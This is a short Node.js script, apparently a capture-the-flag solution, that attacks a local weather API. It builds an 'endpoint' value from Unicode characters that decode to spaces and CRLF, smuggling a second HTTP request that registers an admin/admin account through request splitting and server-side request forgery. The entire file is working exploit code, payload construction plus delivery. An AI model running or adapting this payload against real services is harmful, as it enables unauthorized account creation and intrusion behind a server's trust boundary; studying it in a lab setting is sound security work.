var request = require('request');

var exploit_str = "127.0.0.1/\u{0120}HTTP/1.1\
\u{010D}\u{010A}\u{010D}\u{010A}\
POST\u{0120}http://127.0.0.1/register\u{0120}HTTP/1.1\
\u{010D}\u{010A}\
Content-Type:\u{0120}application/json\
\u{010D}\u{010A}\u{010D}\u{010A}\
{\u{0122}username\u{0122}:\u{0122}admin\u{0122},\u{0122}password\u{0122}:\u{0122}admin\u{0122}}\
\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\
GET\u{0120}"

var endpoint_str = Buffer.from(exploit_str, 'latin1').toString()
console.log(endpoint_str)

var options = {
  uri: 'http://127.0.0.1:8080/api/weather',
  method: 'POST',
  json: {
    "endpoint": exploit_str,
    "city": "Columbus",
    "country": "USA" 
  }
};

request(options, function (error, response, body) {
  if (!error && response.statusCode == 200) {
    console.log(body.id)
  }else{
    console.log("oop");
  }
});